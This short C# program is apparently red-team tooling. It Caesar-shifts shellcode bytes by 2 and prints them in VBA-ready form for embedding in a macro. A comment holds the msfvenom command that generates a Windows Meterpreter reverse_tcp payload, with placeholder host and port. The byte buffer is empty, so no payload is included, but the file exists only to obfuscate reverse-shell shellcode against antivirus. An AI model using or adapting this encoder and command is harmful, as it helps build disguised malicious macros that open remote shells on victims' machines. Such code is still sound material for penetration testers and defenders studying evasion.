using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Program
{
    public class vba_encrypt   // Caesar Cipher Encryption
    {
        public static void Main(string[] args)
        {
            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f csharp
            byte[] buf = new byte[0] { };
            byte[] encoded = new byte[buf.Length];
            for(int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);  // shift of 2 
            }
            uint counter = 0;

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach(byte b in encoded)
            {
                hex.AppendFormat("{0:D}, ", b);
                counter++;
                if(counter % 50 == 0)
                {
                    hex.AppendFormat("_{0}", Environment.NewLine);
                }
            }
            Console.WriteLine("The payload is: " + hex.ToString());
        }
    }
}